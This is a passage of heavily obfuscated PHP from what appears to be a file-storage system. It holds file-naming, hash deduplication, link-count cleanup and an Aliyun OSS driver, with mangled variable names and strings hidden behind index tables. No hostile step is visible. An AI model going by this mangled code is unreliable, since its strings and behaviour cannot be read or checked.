$´è–ŸÇ, $”Íªî½æ, !0); if (file_exists($øØš¤»ç)) { @unlink($øØš¤»ç); } return $õ¸ºî‘€; } public function createFileName($“º˜Àğë, $û™ı¥ä‰, $»ôŸËæ¢ = false, $ıö¡ ‹Ë = false) { $ÉİÊäñ© =& $_SERVER[¯‘·½]; $µ›è¥‚ = IO::init($ÉİÊäñ©[8]); $®ô¦£¼‘ = $this->_makeFilePath($“º˜Àğë, $û™ı¥ä‰, $µ›è¥‚, $»ôŸËæ¢, $ıö¡ ‹Ë); $¼‡ƒ¥ = $µ›è¥‚->pathFather($®ô¦£¼‘); static $Îã ÆÓ = false; $‡Òì£Šï = $ÉİÊäñ©[2059] . md5($¼‡ƒ¥); if (!$Îã ÆÓ && !Cache::get($‡Òì£Šï)) { $Îã ÆÓ = !0; $¬­Ñ˜ïÔ = IO::mkdir($¼‡ƒ¥); if (!IO::exist($¬­Ñ˜ïÔ . $ÉİÊäñ©[885])) { IO::mkfile($¬­Ñ˜ïÔ . $ÉİÊäñ©[885]); } Cache::set($‡Òì£Šï, 1, 3600 * 2); } return $®ô¦£¼‘; } public function _makeFilePath($üáİäï‡, $Ÿ‡ë‡¶¾, $ûÇş¥ˆ, $ˆİ·êŠ = false, $” °ãØÕ = false) { $ÊÕ—‘¥ =& $_SERVER[¯‘·½]; $¥ùÉÙ = Model($ÊÕ—‘¥[856])->get($ÊÕ—‘¥[2060]); $ç‚Ã à• = $ÊÕ—‘¥[1346] . $Ÿ‡ë‡¶¾[$ÊÕ—‘¥[477]] . $ÊÕ—‘¥[486] . date($ÊÕ—‘¥[2061]); $©µĞ‹Ï· = $ç‚Ã à• . rand_string(5) . short_id(100); $üáİäï‡ = str_replace($ÊÕ—‘¥[8], $ÊÕ—‘¥[11], KodIO::clear($üáİäï‡)); $Æ’‡ İá = $ûÇş¥ˆ->ext($üáİäï‡); if (!$üáİäï‡) { $¥ùÉÙ = $ÊÕ—‘¥[862]; } switch ($¥ùÉÙ) { case $ÊÕ—‘¥[2062]: if ($Æ’‡ İá) { $©µĞ‹Ï· = $©µĞ‹Ï· . $ÊÕ—‘¥[10] . $Æ’‡ İá; } if ($Æ’‡ İá == $ÊÕ—‘¥[1999]) { $©µĞ‹Ï· .= $ÊÕ—‘¥[1315]; } break; case $ÊÕ—‘¥[2063]: $Ùãàà¾Œ = Model($ÊÕ—‘¥[856])->get($ÊÕ—‘¥[857]); $úå£ÖŸ = substr(md5($ÊÕ—‘¥[858] . $Ùãàà¾Œ . date($ÊÕ—‘¥[834])), 0, 8); $ç‚Ã à• = $ÊÕ—‘¥[1346] . $Ÿ‡ë‡¶¾[$ÊÕ—‘¥[477]] . $ÊÕ—‘¥[486] . date($ÊÕ—‘¥[2064]) . $úå£ÖŸ . $ÊÕ—‘¥[8]; if ($Æ’‡ İá == $ÊÕ—‘¥[1999]) { $üáİäï‡ .= $ÊÕ—‘¥[1315]; } $ğı¡º¼ = $ÊÕ—‘¥[2065] . $ç‚Ã à• . $üáİäï‡; CacheLock::lock($ğı¡º¼); $©µĞ‹Ï· = $ç‚Ã à• . $üáİäï‡; if (IO::exist($ç‚Ã à• . $üáİäï‡)) { $ß¿Ø†½û = substr($üáİäï‡, 0, strlen($üáİäï‡) - strlen($Æ’‡ İá)); $şŸƒš¦¥ = $” °ãØÕ ? substr($” °ãØÕ, 0, 5) : ($ˆİ·êŠ ? substr($ˆİ·êŠ, 0, 5) : rand_string(5)); $şŸƒš¦¥ .= rand_string(3); $©µĞ‹Ï· = $ç‚Ã à• . $ß¿Ø†½û . $şŸƒš¦¥; if ($Æ’‡ İá) { $©µĞ‹Ï· = $©µĞ‹Ï· . $ÊÕ—‘¥[10] . $Æ’‡ İá; } } if (IO::isOsDriver($©µĞ‹Ï·) && !IO::isUploadServer($©µĞ‹Ï·)) { if (IO::exist($©µĞ‹Ï·)) { CacheLock::unlock($ğı¡º¼); return $©µĞ‹Ï·; } $¦›×Û·¿ = IO::setContent($©µĞ‹Ï·, $ÊÕ—‘¥[12]); if (!$¦›×Û·¿) { show_json($ÊÕ—‘¥[2066], !1); } } CacheLock::unlock($ğı¡º¼); break; case $ÊÕ—‘¥[862]: break; default: break; } return $©µĞ‹Ï·; } public function addFileByRemote($©Ó…øÕ, $­ƒç à, $Ê½’óÃŠ = array()) { $Ê¥é•±­ =& $_SERVER[¯‘·½]; if (!IO::isFile($©Ó…øÕ)) { return !1; } $ ş°Å×± = $Ê½’óÃŠ[$Ê¥é•±­[551]] ? $Ê½’óÃŠ[$Ê¥é•±­[551]] : $Ê¥é•±­[12]; $Üõ†¬¶ = IO::hashMd5($©Ó…øÕ, $ ş°Å×±); $Ø¶Äìåø = KodIO::parse($©Ó…øÕ); $µ “Î“ = array($Ê¥é•±­[624] => IO::size($©Ó…øÕ), $Ê¥é•±­[2067] => 1, $Ê¥é•±­[496] => $­ƒç à, $Ê¥é•±­[899] => $Ø¶Äìåø[$Ê¥é•±­[477]], $Ê¥é•±­[497] => $©Ó…øÕ, $Ê¥é•±­[2068] => $Ê½’óÃŠ[$Ê¥é•±­[679]] ? $Ê½’óÃŠ[$Ê¥é•±­[679]] : IO::hashSimple($©Ó…øÕ), $Ê¥é•±­[2069] => $Üõ†¬¶ ? $Üõ†¬¶ : $ ş°Å×±); if ($£Ê¼ş¢í = $this->addFileCheckExist($µ “Î“[$Ê¥é•±­[679]], $µ “Î“[$Ê¥é•±­[551]], $µ “Î“[$Ê¥é•±­[79]])) { return $£Ê¼ş¢í; } return $this->addFileData($µ “Î“); } private function addFileData($èá€íŠà) { $áê¡£×Å =& $_SERVER[¯‘·½]; if (!$èá€íŠà) { return !1; } if (!IO::isFile($èá€íŠà[$áê¡£×Å[87]])) { return !1; } $èá€íŠà[$áê¡£×Å[79]] = intval($èá€íŠà[$áê¡£×Å[79]]); if (!$èá€íŠà[$áê¡£×Å[79]] && strlen($èá€íŠà[$áê¡£×Å[679]]) > 32) { $èá€íŠà[$áê¡£×Å[79]] = intval(substr($èá€íŠà[$áê¡£×Å[679]], 32)); } $­§ëÒ¬™ = $this->add($èá€íŠà); return $this->find($­§ëÒ¬™); } public function addFile($îúˆîÛĞ, $ïò±é¶£, $ÔéñÄœÑ, $ÁèÉÔÖ = false) { $İ¾Ïıí =& $_SERVER[¯‘·½]; $£‹ú¯¶ë = IO::hashSimple($îúˆîÛĞ); $Ìí½ÍÚá = IO::size($îúˆîÛĞ); $Â‹œã¼ = $Ìí½ÍÚá <= 1024 * 1024 * 10 ? IO::hashMd5($îúˆîÛĞ) : $İ¾Ïıí[12]; $æ™×á‰Ú = $İ¾Ïıí[2070] . $£‹ú¯¶ë; CacheLock::lock($æ™×á‰Ú); if ($Â‹œã¼ && $£‹ú¯¶ë) { $Ñï £Ü¬ = $this->addFileCheckExist($£‹ú¯¶ë, $Â‹œã¼, $Ìí½ÍÚá); if ($Ñï £Ü¬) { CacheLock::unlock($æ™×á‰Ú); return $Ñï £Ü¬; } } $§§ÑÚìË = $this->addFileMake($îúˆîÛĞ, $ïò±é¶£, $Ìí½ÍÚá, $£‹ú¯¶ë, $Â‹œã¼, $ÔéñÄœÑ, $ÁèÉÔÖ); $²µ…Ù²ƒ = $this->addFileData($§§ÑÚìË); if (!$²µ…Ù²ƒ) { return !1; } CacheLock::unlock($æ™×á‰Ú); if (!$Â‹œã¼ && $²µ…Ù²ƒ) { $this->fileMd5Check($²µ…Ù²ƒ); } return $²µ…Ù²ƒ; } public function fileMd5Check($Ù¹ŞÕæ) { $ĞËïİøÅ =& $_SERVER[¯‘·½]; $ÑÃ§£Æè = array($Ù¹ŞÕæ[$ĞËïİøÅ[545]], $Ù¹ŞÕæ[$ĞËïİøÅ[87]]); $ÒÄ‚íè‹ = $ĞËïİøÅ[2071] . $Ù¹ŞÕæ[$ĞËïİøÅ[87]]; $£ôûˆá = $ĞËïİøÅ[2072] . $Ù¹ŞÕæ[$ĞËïİøÅ[545]]; TaskQueue::add($ĞËïİøÅ[2073], $ÑÃ§£Æè, $ÒÄ‚íè‹, $£ôûˆá); } public function fileMd5Set($ÇÉÂáÊ—, $Ö³‡Ì…ñ) { $éÙ‡Øƒ =& $_SERVER[¯‘·½]; $÷µôÒ˜ = $this->find($ÇÉÂáÊ—); if (!$÷µôÒ˜ || $÷µôÒ˜[$éÙ‡Øƒ[551]]) { return; } $œÈŞ—’ = IO::hashMd5($Ö³‡Ì…ñ); if (!$œÈŞ—’) { return $éÙ‡Øƒ[12]; } $this->where(array($éÙ‡Øƒ[545] => $ÇÉÂáÊ—))->save(array($éÙ‡Øƒ[551] => $œÈŞ—’)); } public function addFileMake($‚‰£õ¹ì, $·ŠÈşÍò, $şµ¡ìÑÂ, $ùº×Ü§ø, $µ§ó™º», $ç¸ÎÜÁü, $¡üŠ’Û×) { $‰‚¾Çˆ =& $_SERVER[¯‘·½]; $ç®™Ù = $this->createFileName($ç¸ÎÜÁü, $·ŠÈşÍò, $ùº×Ü§ø, $µ§ó™º»); $Ü¡ƒ•‘” = get_path_father($ç®™Ù); $ãø§´Ã³ = get_path_this($ç®™Ù); if ($¡üŠ’Û×) { $˜Æàò…â = IO::move($‚‰£õ¹ì, $Ü¡ƒ•‘”, !1, $ãø§´Ã³); } else { $˜Æàò…â = IO::copy($‚‰£õ¹ì, $Ü¡ƒ•‘”, !1, $ãø§´Ã³); } if (!$˜Æàò…â) { return !1; } $±áìëÊµ = IO::init($˜Æàò…â); $±áìëÊµ->cacheMethod($‰‚¾Çˆ[182], $±áìëÊµ->path, $‰‚¾Çˆ[179]); if (IO::size($˜Æàò…â) != $şµ¡ìÑÂ) { return !1; } $¥å…£ = array($‰‚¾Çˆ[624] => $şµ¡ìÑÂ, $‰‚¾Çˆ[2067] => 1, $‰‚¾Çˆ[496] => $ç¸ÎÜÁü, $‰‚¾Çˆ[899] => $·ŠÈşÍò[$‰‚¾Çˆ[477]], $‰‚¾Çˆ[497] => $ç®™Ù, $‰‚¾Çˆ[2068] => $ùº×Ü§ø, $‰‚¾Çˆ[2069] => $µ§ó™º»); return $¥å…£; } public function addFileCheckExist($Šš¢²ÁÀ, $å¸õÜ», $«ĞÔôøú) { $Òšîö‚§ =& $_SERVER[¯‘·½]; $†ÇüÎ„ = $this->findByHash($Šš¢²ÁÀ, $å¸õÜ»); if (!$†ÇüÎ„) { return !1; } $­±Ê¦ôï = array($Òšîö‚§[2067] => intval($†ÇüÎ„[$Òšîö‚§[2074]]) + 1, $Òšîö‚§[624] => $«ĞÔôøú); $this->where(array($Òšîö‚§[546] => $†ÇüÎ„[$Òšîö‚§[545]]))->save($­±Ê¦ôï); return $†ÇüÎ„; } public function remove($İÙ¶ÓŠ) { $this->linkCountChange($İÙ¶ÓŠ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ŒÊá¾¬) { $this->linkCountChange($ŒÊá¾¬, !0); } public function linkCountChange($Ãª‚äÜ–, $Á¹ÏÛ…É) { $˜—ŸÛ…Ï =& $_SERVER[¯‘·½]; if (!$Ãª‚äÜ–) { return; } if (!is_array($Ãª‚äÜ–)) { $Ãª‚äÜ– = array($Ãª‚äÜ–); } $‚¾µ‡½× = array(); foreach ($Ãª‚äÜ– as $†Ş—²›š) { $¶öø™‘§ = $†Ş—²›š . $˜—ŸÛ…Ï[12]; if (!$‚¾µ‡½×[$¶öø™‘§]) { $‚¾µ‡½×[$¶öø™‘§] = 0; } $‚¾µ‡½×[$¶öø™‘§]++; } $¾ğ‘ÇÖ  = array(); foreach ($‚¾µ‡½× as $†Ş—²›š => $óšÏÙº›) { $¶öø™‘§ = $óšÏÙº› . $˜—ŸÛ…Ï[12]; if (!$¾ğ‘ÇÖ [$¶öø™‘§]) { $¾ğ‘ÇÖ [$¶öø™‘§] = array(); } $¾ğ‘ÇÖ [$¶öø™‘§][] = $†Ş—²›š; } foreach ($¾ğ‘ÇÖ  as $óšÏÙº› => $è›Ë†Ü’) { if (!$è›Ë†Ü’) { continue; } $óšÏÙº› = $Á¹ÏÛ…É ? $óšÏÙº› : -intval($óšÏÙº›); $€œ»°Í = array($˜—ŸÛ…Ï[545] => array($˜—ŸÛ…Ï[7], $è›Ë†Ü’)); if ($óšÏÙº› < 0) { $€œ»°Í[$˜—ŸÛ…Ï[2074]] = array($˜—ŸÛ…Ï[1111], abs($óšÏÙº›)); } $this->where($€œ»°Í)->setAdd($˜—ŸÛ…Ï[2074], $óšÏÙº›); } } public function findByHash($…Õ€îáÑ, $ÕóçÜ¼œ = false) { $‹Œºßâ =& $_SERVER[¯‘·½]; if (!$…Õ€îáÑ && !$ÕóçÜ¼œ) { return !1; } $õ‚óŠ„¤ = array($‹Œºßâ[2068] => $…Õ€îáÑ); if ($ÕóçÜ¼œ) { $õ‚óŠ„¤ = array($‹Œºßâ[2069] => $ÕóçÜ¼œ); } return $this->order($‹Œºßâ[2075])->where($õ‚óŠ„¤)->find(); } public function clearEmpty($Şªåš¿ = 1) { $ÜëıÔÀ¤ =& $_SERVER[¯‘·½]; $§ˆËª÷Š = time() - 3600 * 24 * $Şªåš¿; $Âä´³ßÓ = $ÜëıÔÀ¤[2076] . $§ˆËª÷Š; $‘åİÕˆ¾ = $this->where($Âä´³ßÓ)->select(); if (!$‘åİÕˆ¾) { return; } $Í†ìØÕÂ = new Task($ÜëıÔÀ¤[2077], $ÜëıÔÀ¤[12], count($‘åİÕˆ¾)); foreach ($‘åİÕˆ¾ as $¦½ß›½ƒ) { $Í†ìØÕÂ->update(1); $this->resetFile($¦½ß›½ƒ); } $Í†ìØÕÂ->end(); } public function resetFile($­ËßŒ©ş) { $Ç¼Èİàñ =& $_SERVER[¯‘·½]; $‰è¡Îä² = array($Ç¼Èİàñ[546] => $­ËßŒ©ş[$Ç¼Èİàñ[545]]); $­Î‰úÜ¿ = Model($Ç¼Èİàñ[1452])->where($‰è¡Îä²)->count(); $Îşòıì„ = Model($Ç¼Èİàñ[2078])->where($‰è¡Îä²)->count(); $íşÂšÚÎ = intval($­Î‰úÜ¿) + intval($Îşòıì„); if ($íşÂšÚÎ == 0) { Model($Ç¼Èİàñ[2079])->delete($­ËßŒ©ş[$Ç¼Èİàñ[545]]); $this->where($‰è¡Îä²)->delete(); $this->metaSet($­ËßŒ©ş[$Ç¼Èİàñ[545]], null, null); if (!IO::isFile($­ËßŒ©ş[$Ç¼Èİàñ[87]])) { write_log(array($Ç¼Èİàñ[2080], ACTION, $­ËßŒ©ş), $Ç¼Èİàñ[1288]); return !1; } IO::remove($­ËßŒ©ş[$Ç¼Èİàñ[87]]); write_log(ACTION . $Ç¼Èİàñ[2081] . KodUser::id() . $Ç¼Èİàñ[2082] . $­ËßŒ©ş[$Ç¼Èİàñ[545]] . $Ç¼Èİàñ[2083] . $­ËßŒ©ş[$Ç¼Èİàñ[79]] . $Ç¼Èİàñ[202] . $­ËßŒ©ş[$Ç¼Èİàñ[87]], $Ç¼Èİàñ[2080]); return; } if ($­ËßŒ©ş[$Ç¼Èİàñ[2074]] != $íşÂšÚÎ) { $this->where($‰è¡Îä²)->save(array($Ç¼Èİàñ[2067] => $íşÂšÚÎ)); } } public function storageInfo($î­’©§È = false) { $ü‹°ñ‘­ =& $_SERVER[¯‘·½]; $¡Ì„ıÄ› = $this->count() + 0.0; $íÈĞ‹ã» = 0; $ğêĞóæ = 1; $€üùıÇ÷ = 0; $ğ¥áæ¼½ = 5000; for ($Ôö»àİØ = 0; $Ôö»àİØ < $¡Ì„ıÄ›; $Ôö»àİØ = $Ôö»àİØ + $ğ¥áæ¼½) { $¹«ÏÚ€” = $this->limit($Ôö»àİØ, $Ôö»àİØ + $ğ¥áæ¼½)->select(); foreach ($¹«ÏÚ€” as $ÂÒâ¯) { $ğêĞóæ += $ÂÒâ¯[$ü‹°ñ‘­[79]] * $ÂÒâ¯[$ü‹°ñ‘­[2074]]; $íÈĞ‹ã» += $ÂÒâ¯[$ü‹°ñ‘­[79]] * ($ÂÒâ¯[$ü‹°ñ‘­[2074]] - 1); $€üùıÇ÷ += $ÂÒâ¯[$ü‹°ñ‘­[2074]]; } } $ˆªŞîôˆ = array($ü‹°ñ‘­[2084] => $ğêĞóæ, $ü‹°ñ‘­[2085] => $íÈĞ‹ã», $ü‹°ñ‘­[2086] => $íÈĞ‹ã» / $ğêĞóæ, $ü‹°ñ‘­[83] => $¡Ì„ıÄ›, $ü‹°ñ‘­[2087] => $€üùıÇ÷); return $ˆªŞîôˆ; } } goto e‹õ±ô‚Ì; CÅ¼æ©äß: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Á¼æÆß¸) { parent::__construct(); include_once SDK_DIR . $_SERVER[¯‘·½][1494]; $this->_init($Á¼æÆß¸); } public function _init($éØ€â) { $ù­×ÚÇ =& $_SERVER[¯‘·½]; $this->config = $éØ€â; foreach ($éØ€â as $Ùñ€è‰ï => $œˆ›ºÉ) { if (isset($this->{$Ùñ€è‰ï})) { $this->{$Ùñ€è‰ï} = $œˆ›ºÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ù­×ÚÇ[1495] . LNG($ù­×ÚÇ[1496])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ˆå¶×¹  =& $_SERVER[¯‘·½]; $Ú·í”€Ó = new OSS\Model\CorsConfig(); $îöáé‰Ô = new OSS\Model\CorsRule(); $îöáé‰Ô->addAllowedOrigin($ˆå¶×¹ [1497]); $îöáé‰Ô->addAllowedMethod($ˆå¶×¹ [1498]); $îöáé‰Ô->addAllowedMethod($ˆå¶×¹ [1499]); $îöáé‰Ô->addAllowedMethod($ˆå¶×¹ [1500]); $îöáé‰Ô->addAllowedMethod($ˆå¶×¹ [1501]); $îöáé‰Ô->addAllowedMethod($ˆå¶×¹ [165]); $îöáé‰Ô->setMaxAgeSeconds(600); $îöáé‰Ô->addExposeHeader($ˆå¶×¹ [1502]); $îöáé‰Ô->addAllowedHeader($ˆå¶×¹ [1497]); $Ú·í”€Ó->addRule($îöáé‰Ô); try { $this->client->putBucketCors($this->bucket, $Ú·í”€Ó); } catch (OSS\Core\OssException $‡äŒ„) { $this->writeLog(__FUNCTION__ . $ˆå¶×¹ [215] . $‡äŒ„->getMessage()); return !1; } return !0; } public function getBucketCors() { $ñ×¦·¯– =& $_SERVER[¯‘·½]; $òøÄ¾¦Á = null; try { $òøÄ¾¦Á = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Òİ™¦ÈŸ) { $this->writeLog(__FUNCTION__ . $ñ×¦·¯–[215] . $Òİ™¦ÈŸ->getMessage()); return null; } if (!$òøÄ¾¦Á || !($áš¶úƒí = $òøÄ¾¦Á->getRules())) { return null; } $Èéå‰·í = $áš¶úƒí[0]->getAllowedOrigins(); $ÔúµÇü = $áš¶úƒí[0]->getAllowedMethods(); $øÍƒ¬ı = $áš¶úƒí[0]->getMaxAgeSeconds(); $¾˜ƒ’¦² = $áš¶úƒí[0]->getExposeHeaders(); $¼ıò÷ª = $áš¶úƒí[0]->getAllowedHeaders(); return array($ñ×¦·¯–[221] => isset($Èéå‰·í[0]) ? $Èéå‰·í[0] : $ñ×¦·¯–[12], $ñ×¦·¯–[225] => $ÔúµÇü, $ñ×¦·¯–[1503] => $øÍƒ¬ı, $ñ×¦·¯–[1504] => isset($¾˜ƒ’¦²[0]) ? $¾˜ƒ’¦²[0] : $ñ×¦·¯–[12], $ñ×¦·¯–[222] => isset($¼ıò÷ª[0]) ? $¼ıò÷ª[0] : $ñ×¦·¯–[12]); } public function isBucketCors() { $ÒÛàØÃ€ =& $_SERVER[¯‘·½]; $´»ğ‚Êİ = $this->getBucketCors(); if (!$´»ğ‚Êİ || !is_array($´»ğ‚Êİ)) { return !1; } if ($´»ğ‚Êİ[$ÒÛàØÃ€[221]] != $ÒÛàØÃ€[223] || $´»ğ‚Êİ[$ÒÛàØÃ€[222]] != $ÒÛàØÃ€[223]) { return !1; } $”ŞÁÔö÷ = array_map($ÒÛàØÃ€[224], $´»ğ‚Êİ[$ÒÛàØÃ€[225]]); if (!is_array($”ŞÁÔö÷)) { $”ŞÁÔö÷ = array(); } $ˆìÉä‘İ = array($ÒÛàØÃ€[226], $ÒÛàØÃ€[227], $ÒÛàØÃ€[228], $ÒÛàØÃ€[229], $ÒÛàØÃ€[230]); $‚Ä±İ‚Ú = array_diff($ˆìÉä‘İ, $”ŞÁÔö÷); return empty($‚Ä±İ‚Ú); } public function mkfile($äÎöë, $ªçı¨º½ = '', $¥”ÜÌÎ = REPEAT_RENAME) { $Á€®Ÿ‚– = $this->setContent($äÎöë, $ªçı¨º½); if ($Á€®Ÿ‚– !== !1) { return $this->getPathOuter($äÎöë); } return !1; } public function mkdir($ÉäÆïšİ, $Ì€Œğôâ = REPEAT_SKIP) { if ($Ì€Œğôâ && $this->_isFolder($ÉäÆïšİ)) { return $this->getPathOuter($ÉäÆïšİ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÉäÆïšİ)); } catch (OSS\Core\OssException $æ¯ØŒ‘Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $æ¯ØŒ‘Ö->getMessage()); return !1; } return $this->getPathOuter($ÉäÆïšİ); } private function fileList($úÚÂùèË, $Ù›¾…ëô = '', $Õ÷šó× = 0) { $ø ‡®§ =& $_SERVER[¯‘·½]; $úÚÂùèË = trim($úÚÂùèË, $ø ‡®§[8]); $ôˆÖ·ËĞ = empty($úÚÂùèË) && $úÚÂùèË !== $ø ‡®§[231] ? $ø ‡®§[12] : $úÚÂùèË . $ø ‡®§[8]; $³¨³çèö = $ø ‡®§[12]; $şÆ¯ˆ•¯ = 1000; $áªğñ¤Ò = $Ü¢ÒÄšè = array(); while (!0) { check_abort(); $½‰ßñ’ª = array($ø ‡®§[1505] => $Ù›¾…ëô, $ø ‡®§[1506] => $ôˆÖ·ËĞ, $ø ‡®§[1507] => $şÆ¯ˆ•¯, $ø ‡®§[1508] => $³¨³çèö); try { $Å™ê±ª = $this->client->listObjects($this->bucket, $½‰ßñ’ª); } catch (OSS\Core\OssException $ÜµØ¼Ô) { $this->writeLog(__FUNCTION__ . $ø ‡®§[215] . $ÜµØ¼Ô->getMessage()); break; } $³¨³çèö = $Å™ê±ª->getNextMarker(); $ı…ëÈÔ“ = $Å™ê±ª->getObjectList(); $øİ±Ñ¨ğ = $Å™ê±ª->getPrefixList(); foreach ($ı…ëÈÔ“ as $É´úÜõÂ) { if ($É´úÜõÂ->getKey() == $ôˆÖ·ËĞ) { continue; } $•Ô»¶”Ù = $É´úÜõÂ->getKey(); $…ú¡¸Å = $É´úÜõÂ->getSize(); $£îÒÚÁÈ = $É´úÜõÂ->getLastModified(); $×Ô‘êİ™ = trim($É´úÜõÂ->getETag(), $ø ‡®§[121]); $¸ò‰™‰ = $Õ÷šó× ? array($ø ‡®§[32] => $•Ô»¶”Ù, $ø ‡®§[79] => $…ú¡¸Å, $ø ‡®§[207] => strtotime($£îÒÚÁÈ), $ø ‡®§[1509] => $×Ô‘êİ™) : $•Ô»¶”Ù; $ô¥Ğ®ÂÆ = $…ú¡¸Å == 0 && substr($•Ô»¶”Ù, strlen($•Ô»¶”Ù) - 1, 1) == $ø ‡®§[8] ? !0 : !1; $Û¤åÃ— = array($ø ‡®§[79] => $…ú¡¸Å, $ø ‡®§[1510] => $…ú¡¸Å, $ø ‡®§[88] => strtotime($£îÒÚÁÈ), $ø ‡®§[1511] => $£îÒÚÁÈ, $ø ‡®§[1509] => $×Ô‘êİ™); $this->cacheMethodInfoSet($•Ô»¶”Ù, $ô¥Ğ®ÂÆ, $Û¤åÃ—); if ($ô¥Ğ®ÂÆ) { $áªğñ¤Ò[] = $•Ô»¶”Ù; continue; } $Ü¢ÒÄšè[] = $¸ò‰™‰; } foreach ($øİ±Ñ¨ğ as $­à™úœ) { $áªğñ¤Ò[] = $­à™úœ->getPrefix(); $this->cacheMethodInfoSet($­à™úœ->getPrefix(), !0); } if ($³¨³çèö === $ø ‡®§[12]) { break; } } $this->cacheMethodInfoSet($úÚÂùèË, !0); return array($ø ‡®§[85] => $áªğñ¤Ò, $ø ‡®§[86] => $Ü¢ÒÄšè); } public function listObject($šç«›¶á, $ÚŞº¤æĞ = '') { $¡Åîü– =& $_SERVER[¯‘·½]; $šç«›¶á = trim($šç«›¶á, $¡Åîü–[8]); $æÅÕ¨ñ = empty($šç«›¶á) && $šç«›¶á !== $¡Åîü–[231] ? $¡Åîü–[12] : $šç«›¶á . $¡Åîü–[8]; $½Øâúêğ = $¡Åîü–[12]; $¯˜±Œ±ù = 1000; $ŞÑšá˜Å = $Ş—ÎÃßÏ = array(); while (!0) { check_abort(); $ê™ÉÙÑ× = array($¡Åîü–[1505] => $ÚŞº¤æĞ, $¡Åîü–[1506] => $æÅÕ¨ñ, $¡Åîü–[1507] => $¯˜±Œ±ù, $¡Åîü–[1508] => $½Øâúêğ); try { $äõ™é¡ï = $this->client->listObjects($this->bucket, $ê™ÉÙÑ×); } catch (OSS\Core\OssException $¬ÈƒÕ‡) { $this->writeLog(__FUNCTION__ . $¡Åîü–[215] . $¬ÈƒÕ‡->getMessage()); break; } $½Øâúêğ = $äõ™é¡ï->getNextMarker(); $ìÃ­èß¸ = $äõ™é¡ï->getObjectList(); foreach ($ìÃ­èß¸ as $Óƒ´­Û­) { if ($Óƒ´­Û­->getKey() == $æÅÕ¨ñ) { continue; } $ã¡¶Š¦¯ = $Óƒ´­Û­->getKey(); $Û›å“ªâ = $Óƒ´­Û­->getSize(); $“Ÿ´şàœ = $Û›å“ªâ == 0 && substr($ã¡¶Š¦¯, strlen($ã¡¶Š¦¯) - 1, 1) == $¡Åîü–[8] ? !0 : !1; if ($“Ÿ´şàœ) { continue; } $Ş—ÎÃßÏ[] = $Û›å“ªâ . $¡Åîü–[215] . $ã¡¶Š¦¯; } if ($½Øâúêğ === $¡Åîü–[12]) { break; } } return array($¡Åîü–[85] => $ŞÑšá˜Å, $¡Åîü–[86] => $Ş—ÎÃßÏ); } public function copyFile($ç£Œ®¬œ, $»´¹ıíô) { $“×ÇêÖÊ = $this->size($ç£Œ®¬œ); if ($“×ÇêÖÊ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ç£Œ®¬œ, $this->bucket, $this->pathEncode($»´¹ıíô)); } catch (OSS\Core\OssException $ª¬òÂÙ) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $ª¬òÂÙ->getMessage()); return !1; } return $this->getPathOuter($»´¹ıíô); } $êŸöÃò¯ = $this->multiCopyObject($ç£Œ®¬œ, $»´¹ıíô, $“×ÇêÖÊ); return $êŸöÃò¯ ? $this->getPathOuter($»´¹ıíô) : !1; } private function multiCopyObject($ˆ¢®Ôúé, $ÆÖ‰¾¦, $ĞØÑ©Úó) { $ÛÒø´šì =& $_SERVER[¯‘·½]; try { $ŒòŒ³…• = array(); if ($Æ®—Ãô² = $this->hashMd5($ˆ¢®Ôúé)) { $ŒòŒ³…• = array(OSS\OssClient::OSS_HEADERS => array($ÛÒø´šì[1512] => $Æ®—Ãô²)); } $ú‡½¢æ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÆÖ‰¾¦), $ŒòŒ³…•); $Œ¾­©³§ = 1; $¸àÏñÇŸ = 0; $åËƒãõ™ = array(); $‰’šŸ‘ = 1024 * 1024 * 10; $øè·æ”Ë = $this->client->generateMultiuploadParts($ĞØÑ©Úó, $‰’šŸ‘); foreach ($øè·æ”Ë as $µÜ¿ËÑ¦ => $‹ïà€’à) { $íüÓ½³œ = $¸àÏñÇŸ + (int) $‹ïà€’à[$ÛÒø´šì[1513]]; $×¦ı‚¦‰ = (int) $‹ïà€’à[$ÛÒø´šì[414]] + $íüÓ½³œ - 1; $£»ó»¸Ü = array($ÛÒø´šì[167] => $íüÓ½³œ, $ÛÒø´šì[168] => $×¦ı‚¦‰); $åËƒãõ™[] = $this->client->uploadPartCopy($this->bucket, $ˆ¢®Ôúé, $this->bucket, $this->pathEncode($ÆÖ‰¾¦), $Œ¾­©³§, $ú‡½¢æ, $£»ó»¸Ü); $Œ¾­©³§ = $Œ¾­©³§ + 1; } $çˆíˆÓà = array(); foreach ($åËƒãõ™ as $µÜ¿ËÑ¦ => $¥çÈ…ˆ) { $çˆíˆÓà[] = array($ÛÒø´šì[300] => $µÜ¿ËÑ¦ + 1, $ÛÒø´šì[301] => $¥çÈ…ˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÆÖ‰¾¦), $ú‡½¢æ, $çˆíˆÓà); } catch (OSS\Core\OssException $İ ëìµ) { $this->writeLog(__FUNCTION__ . $ÛÒø´šì[215] . $İ ëìµ->getMessage()); return !1; } return !0; } public function moveFile($Š™Êú†Ä, $àÈÇÓÆ) { if ($this->copyFile($Š™Êú†Ä, $àÈÇÓÆ)) { $this->remove($Š™Êú†Ä); return $this->getPathOuter($àÈÇÓÆ); } return !1; } public function delFile($ÎÎğ‰ù¨) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÎÎğ‰ù¨)); } catch (OSS\Core\OssException $¾º‚à) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $¾º‚à->getMessage()); return !1; } return !0; } public function delFolder($à¯ùŠæ¹) { $ÔÌ§øˆ =& $_SERVER[¯‘·½]; if (!$this->exist($à¯ùŠæ¹)) { return !0; } $this->listItemCache = !1; $Á€„ª½í = $this->fileList($à¯ùŠæ¹); $this->listItemCache = !0; 